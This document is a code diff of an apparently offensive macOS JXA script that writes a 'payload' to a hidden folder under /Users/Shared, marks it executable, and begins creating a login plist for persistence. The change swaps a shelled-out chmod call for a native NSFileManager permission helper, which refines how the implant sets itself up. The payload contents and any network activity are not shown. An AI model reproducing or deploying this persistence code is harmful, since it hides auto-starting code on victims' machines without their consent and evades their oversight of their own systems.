@@ -15,22 +15,14 @@ if (userName != 'root')
 {	
 var userHome = $.getenv('HOME')
 
-function executeBackground(binPath,arg1,arg2,arg3){
-	var path = binPath 
-	var args = [arg1,arg2,arg3]
-	var pipe = $.NSPipe.pipe;
-	var file = pipe.fileHandleForReading;
-	var task = $.NSTask.alloc.init;
-	task.launchPath = path;
-	task.arguments = args;
-	task.standardOutput = pipe; 
-	task.standardError = pipe;
-	task.launch; 
-	let data = file.readDataToEndOfFile; 
-    file.closeFile;
-    response = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
-	return response
-	}
+	function chmod(value, path) {
+        let a = $({NSFilePosixPermissions:value})
+        let p = $(path).stringByStandardizingPath
+        let e = $()
+        let r = $.NSFileManager.defaultManager
+                .setAttributesOfItemAtPathError(a, p, e)
+        return r
+    }
 
 function createFolder(path, createIntermediateDirectories) {
     error = $()
@@ -61,7 +53,7 @@ if (hiddenDirectoryExistsCheck == false) {
 var payloadPath = '/Users/Shared/.security/test.sh'
 writeTextToFile(payload, payloadPath, true)
 
-executeBackground("/bin/chmod","+x","/Users/Shared/.security/test.sh","&")					
+chmod(0o755,"/Users/Shared/.security/test.sh")					
 					
 //Login plist
 var loginPlist = 
